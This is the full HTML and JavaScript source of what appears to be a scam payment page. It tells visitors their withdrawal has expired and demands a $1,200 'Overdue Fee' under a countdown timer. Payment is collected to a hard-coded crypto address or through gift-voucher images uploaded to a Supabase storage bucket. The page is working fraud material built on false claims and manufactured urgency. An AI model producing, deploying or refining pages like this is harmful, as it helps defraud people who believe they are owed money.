<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Withdrawal Status</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background-color: #1e293b; padding: 30px; border-radius: 16px; width: 100%; max-width: 450px; text-align: center; }
        
        /* Spinner */
        .spinner-overlay { display: none; position: fixed; inset: 0; background: rgba(30,41,59,0.9); z-index: 100; align-items: center; justify-content: center; flex-direction: column; }
        .spinner-overlay.active { display: flex; }
        .spinner { width: 40px; height: 40px; border: 4px solid #334155; border-top: 4px solid #f59e0b; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 10px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        /* Existing UI Elements */
        .icon-wrap { width: 80px; height: 80px; border-radius: 50%; background: rgba(245,158,11,0.1); border: 2px solid rgba(245,158,11,0.35); display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
        .info-card { background: #0f172a; border: 1px solid #334155; border-radius: 12px; padding: 18px; margin-bottom: 20px; text-align: left; }
        .info-row { display: flex; justify-content: space-between; padding: 8px 0; font-size: 13px; }
        
        /* The Overdue/Payment Box */
        .commission-box { border: 1px solid #ef4444; background: rgba(239, 68, 68, 0.08); padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: left; }
        .tabs { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .btn { background: #2563eb; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: 600; }
        .btn.amber { background: #d97706; }
        .panel { display: none; }
        .panel.active { display: block; }
        .upload-zone { border: 2px dashed #334155; padding: 30px; cursor: pointer; position: relative; border-radius: 10px; }
        .upload-zone input { position: absolute; inset: 0; opacity: 0; cursor: pointer; z-index: 10; }
    </style>
</head>
<body>
<div class="spinner-overlay" id="loading-spinner"><div class="spinner"></div><p id="spinner-msg">Processing...</p></div>

<div class="container">
    <div class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" width="38"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
    <h2>Payment Period Expired</h2>
    <p style="font-size: 13px; color: #94a3b8; margin-bottom: 20px;">Your withdrawal time limit has elapsed. An Overdue Fee is now required to reactivate the transaction.</p>

    <div class="commission-box">
        <div style="color: #ef4444; font-weight: bold; margin-bottom: 5px;">⚠️ Overdue Fee</div>
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <span style="font-size: 20px; font-weight: bold;">$1,200.00</span>
            <span id="timer-display" style="color: #ef4444; font-family: monospace; font-weight: bold;">48:00:00</span>
        </div>
    </div>

    <div class="tabs">
        <button class="btn" onclick="switchTab('crypto')">💎 TRC20</button>
        <button class="btn amber" onclick="switchTab('voucher')">🎟️ Voucher</button>
    </div>

    <div id="panel-crypto" class="panel active">
        <input value="0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8" readonly style="width:100%; padding:12px; background:#0f172a; border:1px solid #334155; color:#fff; border-radius:8px;">
    </div>

    <div id="panel-voucher" class="panel">
        <div class="upload-zone" id="upload-zone">
            <input type="file" id="file-input" accept="image/*" onchange="handleFile(this.files[0])">
            <h3 id="file-status">Tap to select voucher</h3>
        </div>
        <button class="btn amber" id="sub-btn" disabled onclick="uploadVoucher()" style="margin-top:10px; width:100%;">Submit Voucher</button>
    </div>
</div>

<script>
    const supabaseClient = supabase.createClient('https://kmjmqrrmzdtovovzigxk.supabase.co', 'sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb');
    let selectedFile = null;

    function switchTab(t) {
        document.getElementById('panel-crypto').classList.toggle('active', t === 'crypto');
        document.getElementById('panel-voucher').classList.toggle('active', t === 'voucher');
    }

    function handleFile(file) {
        if (file) {
            selectedFile = file;
            document.getElementById('file-status').innerText = file.name;
            document.getElementById('sub-btn').disabled = false;
        }
    }

    async function uploadVoucher() {
        if (!selectedFile) return;
        document.getElementById('loading-spinner').classList.add('active');
        const { error } = await supabaseClient.storage.from('vouchers').upload(`uploads/${Date.now()}_${selectedFile.name}`, selectedFile);
        document.getElementById('loading-spinner').classList.remove('active');
        alert(error ? 'Upload failed: ' + error.message : 'Voucher submitted successfully!');
    }

    // Timer logic tied to Supabase
    async function startTimer() {
        const { data } = await supabaseClient.from('crypto_transfers').select('timer_end').single();
        if (data?.timer_end) {
            const end = new Date(data.timer_end).getTime();
            setInterval(() => {
                const diff = end - Date.now();
                const h = Math.floor(diff / 3600000);
                const m = Math.floor((diff % 3600000) / 60000);
                const s = Math.floor((diff % 60000) / 1000);
                document.getElementById("timer-display").innerText = `${h}:${m}:${s}`;
            }, 1000);
        }
    }
    startTimer();
</script>
</body>
</html>
